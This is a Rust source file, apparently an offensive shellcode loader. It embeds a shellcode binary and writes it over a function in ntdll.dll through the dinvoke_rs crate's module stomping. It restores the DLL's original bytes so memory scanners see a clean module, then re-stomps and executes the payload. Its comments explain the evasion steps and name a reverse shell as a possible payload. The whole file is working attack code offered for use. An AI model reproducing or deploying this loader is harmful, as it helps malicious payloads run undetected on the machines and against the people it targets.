use dinvoke_rs::overload;
use dinvoke_rs::dmanager::Manager;

static SHELLCODE: &[u8] = include_bytes!("../shellcode.bin");

fn execute_shellcode() {
    // for more information on how that technique works use the crate docs
    // http://crates.io/crates/dinvoke_rs/0.2.2
    unsafe {
        // Copy the compile-time embedded shellcode into a heap Vec.
        let shellcode_vec = SHELLCODE.to_vec();

        // Load a legitimate, signed DLL to use as the stomping ground.
        // `ntdll.dll` is chosen because it is always mapped into every process
        // and has many sizable functions — good candidates to overwrite.
        // Loading by name also avoids a static import entry in our IAT.
        let my_dll = dinvoke_rs::dinvoke::load_library_a("ntdll.dll");
        if my_dll == 0 {return;}
        // Overwrite a function inside the loaded DLL with our shellcode.
        // Arguments:
        //   &shellcode_vec — the payload bytes to write
        //   0              — let DInvoke pick the target function automatically
        //                    (it iterates the DLL's exception data looking for
        //                    a function large enough to hold the shellcode)
        //   my_dll         — the module base address to stomp into
        // Returns (original_bytes, stomp_address):
        //   original_bytes — the DLL code that was overwritten (used by dmanager
        //                    to restore the DLL to its clean state)
        //   stomp_address  — the address where the shellcode now lives
        let module = overload::managed_module_stomping(&shellcode_vec, 0, my_dll);

        match module {
            Ok((original_bytes, stomp_address)) => {
                // 1. Create the manager and register the stomped shellcode
                let mut manager = Manager::new();
                // The manager takes ownership of the shellcode bytes and the original DLL bytes.
                // The return value is a Result, so we need to handle it.
                let _ = manager.new_shellcode(stomp_address, shellcode_vec, original_bytes);
                // 2. Hide the shellcode immediately after stomping.
                //    This restores the DLL's original code, so memory scanners see the clean DLL.
                let _ = manager.hide_shellcode(stomp_address);
                // 3. When you actually want to run the shellcode, restomp it first.
                let _ = manager.stomp_shellcode(stomp_address);
                // 4. Execute it.
                let func: unsafe extern "system" fn() = std::mem::transmute(stomp_address);
                func();
                // 5. Hide it again after execution (if the shellcode returns).
                //    If the shellcode exits the process (like a reverse shell), this line won't be reached.
                let _ = manager.hide_shellcode(stomp_address);
            }
            Err(_) => {}
        }
    }
}

fn main() {
    execute_shellcode()
}